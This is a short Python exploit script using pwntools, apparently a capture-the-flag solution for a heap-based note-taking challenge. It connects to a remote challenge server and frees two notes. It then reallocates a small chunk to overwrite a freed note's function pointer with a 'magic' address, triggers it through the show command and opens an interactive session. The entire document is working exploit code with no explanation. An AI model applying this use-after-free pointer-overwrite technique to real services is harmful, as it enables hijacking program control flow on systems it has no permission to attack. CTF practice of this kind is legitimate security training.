from pwn import *

def add(size, content):
    io.sendlineafter('Your choice :', '1')
    io.sendlineafter('Note size :', str(size))
    io.sendlineafter('Content :', content)

def free(index):
    io.sendlineafter('choice :', '2')
    io.sendlineafter('Index :', str(index))

def show(index):
    io.sendlineafter('choice :', '3')
    io.sendlineafter('Index :', str(index))

io = remote('redirect.do-not-trust.hacking.run', 10020)
magic_address = 0x8048945
add(0x20, b'fuck')
add(0x20, b'fuck')
free(0)
free(1)
add(0x8, p64(magic_address))
show(0)
io.interactive()